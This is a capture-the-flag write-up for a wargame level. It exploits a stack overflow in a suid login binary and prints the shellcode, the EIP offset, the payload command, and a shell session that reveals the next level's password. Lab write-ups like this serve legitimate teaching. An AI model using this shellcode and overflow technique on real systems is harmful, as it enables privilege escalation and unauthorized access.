# Level1

## Solution

* There is one file in our home, ```level1```, belonging to ```level2``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the very long disassembled code, but we will describe its behaviour:

	* ```main()``` allocates an on-stack buffer of ```0x40``` bytes
	* it then prompts the user for a username
	* the user input is stored in a global variable, ```a_user_name``` and its content is checked byt ```verify_user_name()``` : if the string is other than ```dat_wil```, ```main()``` returns
	* ```main()``` then prompts the user for a password
	* the user input, obtained with ```fget()``` with ```0x64``` possible bytes, is this time stored in the on-stack buffer
	* whatever is the return of ```verify_user_pass```, the function outputs ```nope, incorrect password...``` and returns


* What we did with all of that:

	* our goal was to use the buffer allocated in ```main()``` to write an address of a shellcode in place of the former ```eip``` address
	* indeed, the buffer size is ```0x40``` bytes while ```fgets``` accepts up to ```0x64``` bytes
	* to get the offset until the former ```eip```, we use a pattern in ```gdb peda```: the result is ```EIP+0 found at offset: 80```
	* we stored a shellcode in an environment variable:
	```sh
	```export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"`
	```
	* we got the address by executing env program (see the Ressources) 
	```
	level01@OverRide:/var/crash$ /var/crash/env SHELLCODE
	SHELLCODE: 0xffffd4a8
	```
	* we wrote the content of the tow user inputs in one single file:
	```sh
	python -c "print('dat_wil' + '0' * 248 + 'A' * 80 + 'a8d4ffff'.decode('hex'))" > /var/crash/lvl1
	```
	* then we can exploit the program:
	```
	level01@OverRide:~$ cat /var/crash/lvl1 - | ./level01
	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....

	Enter Password:
	nope, incorrect password...

	cd ../level02
	cat .pass
	PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
	```

